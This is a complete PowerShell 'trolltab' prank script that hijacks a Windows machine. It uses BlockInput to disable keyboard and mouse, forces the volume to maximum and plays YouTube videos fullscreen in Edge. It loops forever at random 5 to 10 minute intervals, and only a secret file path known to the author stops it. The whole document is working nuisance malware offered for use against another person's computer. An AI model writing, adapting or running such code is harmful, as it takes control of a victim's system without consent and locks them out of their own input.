# Standalone Trolltab Script with Fullscreen Video and Developer Escape (File Retained)
# -------------------------------------------------------------------------------
# This script performs the following:
# 1. Plays a designated special video once (it will not be repeated).
# 2. Enters an infinite loop to randomly select and play one of several YouTube videos.
#
# For each video:
# - The script uses youtube-dl to retrieve the video's exact duration.
# - It maximizes system volume by simulating "Volume Up" key presses.
# - It disables both keyboard and mouse input (via BlockInput) so that user input is ignored.
# - It launches Microsoft Edge in fullscreen mode using the --start-fullscreen parameter.
# - It waits for the video's exact duration before re-enabling input.
# - It then waits a random interval (5-10 minutes) before playing the next video.
#
# A developer escape function is provided: if the file "C:\dev_escape.txt" is created,
# the script will immediately re-enable input and terminate. The escape file will not be deleted.
#
# Note: This script requires youtube-dl to be installed and available in your system PATH.

# --- Load .NET type to disable keyboard and mouse input ---
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyboardDisabler {
    // BlockInput disables both keyboard and mouse input
    [DllImport("user32.dll")]
    public static extern int BlockInput(bool fBlockIt);
}
"@

# --- Developer Escape Function ---
# Check every second for the existence of "C:\dev_escape.txt".
# If the file is found, re-enable input and terminate the script.
$escapeTimer = New-Object System.Timers.Timer
$escapeTimer.Interval = 1000
$escapeTimer.AutoReset = $true
$escapeTimer.Enabled = $true
$escapeTimer.Add_Elapsed({
    if (Test-Path "C:\dev_escape.txt") {
        # Re-enable keyboard and mouse input (if blocked)
        [KeyboardDisabler]::BlockInput($false)
        Write-Host "Developer escape triggered. Exiting script..."
        Stop-Process -Id $PID
    }
})

# --- Function to Convert Duration String to Seconds ---
function Convert-DurationToSeconds {
    param(
        [string]$durationString
    )
    $durationString = $durationString.Trim()
    $parts = $durationString -split ":"
    $seconds = 0
    if ($parts.Length -eq 3) {
        $hours = [int]$parts[0]
        $minutes = [int]$parts[1]
        $secs = [int]$parts[2]
        $seconds = $hours * 3600 + $minutes * 60 + $secs
    }
    elseif ($parts.Length -eq 2) {
        $minutes = [int]$parts[0]
        $secs = [int]$parts[1]
        $seconds = $minutes * 60 + $secs
    }
    else {
        $seconds = [int]$durationString
    }
    return $seconds
}

# --- Function to Retrieve Video Duration using youtube-dl ---
function Get-VideoDuration {
    param(
        [string]$url
    )
    try {
        $durationString = & youtube-dl --get-duration $url
        if ($durationString) {
            return Convert-DurationToSeconds $durationString
        }
        else {
            Write-Host "Failed to get duration for $url. Using default duration of 180 seconds."
            return 180
        }
    }
    catch {
        Write-Host "Error retrieving duration for $url. Using default duration of 180 seconds."
        return 180
    }
}

# --- Function to Play a Video by URL ---
function Play-Video {
    param (
        [string]$url
    )
    
    $duration = Get-VideoDuration -url $url
    Write-Host "Playing video: $url"
    Write-Host "Duration: $duration seconds"
    
    # Maximize system volume by sending "Volume Up" keys (simulate input)
    $WshShell = New-Object -ComObject WScript.Shell
    for ($i = 0; $i -lt 50; $i++) {
        $WshShell.SendKeys([char]175)
        Start-Sleep -Milliseconds 100
    }
    
    # Disable both keyboard and mouse input
    [KeyboardDisabler]::BlockInput($true)
    
    # Launch Microsoft Edge in fullscreen mode with the given URL
    # The "--start-fullscreen" argument forces Edge into fullscreen mode.
    Start-Process "msedge.exe" "--start-fullscreen $url"
    
    # Wait for the video's duration
    Start-Sleep -Seconds $duration
    
    # Re-enable input (keyboard and mouse)
    [KeyboardDisabler]::BlockInput($false)
}

# --- Main Script Execution ---

# 1. Play the special video once (this video will not be repeated)
$specialVideoUrl = "https://youtu.be/RWnaWpBCAC0?si=zGmzaWdDULxtt1Z4"
Play-Video -url $specialVideoUrl

# 2. Define the list of random videos
$randomVideos = @(
    "https://youtu.be/q7ja7C8IhZM?si=e27mgoLEzj4z1dhe",
    "https://www.youtube.com/watch?v=IBkscgruZsM",
    "https://youtu.be/xvFZjo5PgG0?si=QFo3WAOZwVNZzbLz",
    "https://youtu.be/_-2dIuV34cs?si=zV3AhfQdu0fi0oQ_"
)

# 3. Enter an infinite loop to randomly select and play a video from the list
while ($true) {
    $selectedVideo = Get-Random -InputObject $randomVideos
    Play-Video -url $selectedVideo
    
    # Wait for a random interval between 5 and 10 minutes (300-600 seconds)
    $waitTime = Get-Random -Minimum 300 -Maximum 600
    Write-Host "Waiting for $waitTime seconds before playing the next video."
    Start-Sleep -Seconds $waitTime
}
